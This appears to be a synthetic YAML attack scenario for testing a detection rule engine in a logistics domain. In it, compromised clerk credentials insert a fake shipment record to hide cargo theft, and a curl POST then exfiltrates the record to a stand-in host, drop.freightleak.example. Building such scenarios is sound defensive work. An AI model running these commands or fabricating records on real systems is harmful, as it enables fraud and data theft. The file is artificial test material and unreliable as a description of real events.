# Leak 2 (sql-verb): malicious tamper via rogue INSERT (not UNION/COPY) --
# compromised warehouse_clerk credentials fabricate a ghost shipment record
# to cover a cargo-theft diversion, then exfiltrate the fabricated record
# externally via ordinary curl/python3 (Leak 4: ordinary comm names).
scenario_id: logistics_run03_rogue_insert_ghost_shipment_01
family_id: logistics_run03_rogue_insert_ghost_shipment
domain: logistics
time_of_day: "01:05"
default_class: malicious
rule_engine_relationship: malicious_false_negative
sessions:
  - session_label: ghost_shipment
    role: warehouse_clerk
    anchor: db
    timing:
      tempo: bursty
      step_gaps_seconds: [1.2]
    events:
      - step_id: insert_ghost
        sql: "INSERT INTO shipments (shipment_id, origin_warehouse_id, dest_address, driver_id, vehicle_id, status, dispatched_at) VALUES (99042, 3, '14 Backlot Drive, Undisclosed', 63488, 7715, 'dispatched', '2026-09-21 01:05:00')"
      - step_id: dump_json
        process: {comm: python3, args: ["/tmp/build_ghost_manifest.py"], parent: insert_ghost}
      - step_id: write_file
        file: {path: "/tmp/ghost_manifest.json", syscall: openat, parent: dump_json}
      - step_id: exfil_curl
        process: {comm: curl, args: ["-sX", "POST", "https://drop.freightleak.example/sync", "-d", "@/tmp/ghost_manifest.json"], parent: dump_json}
        connects_to: {ip: "185.220.101.44", port: 443}
